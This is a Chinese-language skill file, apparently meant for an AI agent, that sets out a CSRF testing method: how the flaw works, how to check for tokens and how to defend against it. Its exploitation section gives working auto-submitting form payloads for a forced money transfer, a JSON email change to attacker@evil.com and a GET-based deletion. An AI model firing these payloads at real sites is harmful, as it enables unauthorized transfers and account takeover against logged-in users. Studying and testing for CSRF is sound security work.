---
name: csrf-testing
description: CSRF跨站请求伪造测试的专业技能和方法论
version: 1.0.0
---

# CSRF跨站请求伪造测试

## 概述

CSRF（Cross-Site Request Forgery）是一种利用用户已登录状态进行未授权操作的攻击方式。

## 漏洞原理

- 攻击者诱导用户访问恶意页面
- 恶意页面自动发送请求到目标网站
- 浏览器自动携带用户的认证信息（Cookie、Session）
- 目标网站误认为是用户合法操作

## 测试方法

### 1. 识别敏感操作
- 密码修改、邮箱修改
- 转账操作、权限变更
- 数据删除、状态更新

### 2. 检测CSRF Token
```html
<!-- 有Token保护 -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
</form>

<!-- 无Token保护 - 存在CSRF风险 -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. 验证Token有效性
- Token是否基于时间戳
- Token是否基于用户ID
- Token是否可重复使用

## 利用技术

### 基础CSRF攻击
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF
```html
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
```

### GET请求CSRF
```html
<img src="https://target.com/api/delete?id=123">
```

## 防护措施

1. **CSRF Token** - 每个表单包含唯一Token
2. **SameSite Cookie** - `Set-Cookie: session=abc123; SameSite=Strict; Secure`
3. **双重提交Cookie** - Token同时存在于Cookie和表单
4. **Referer验证** - 验证Referer是否为同源
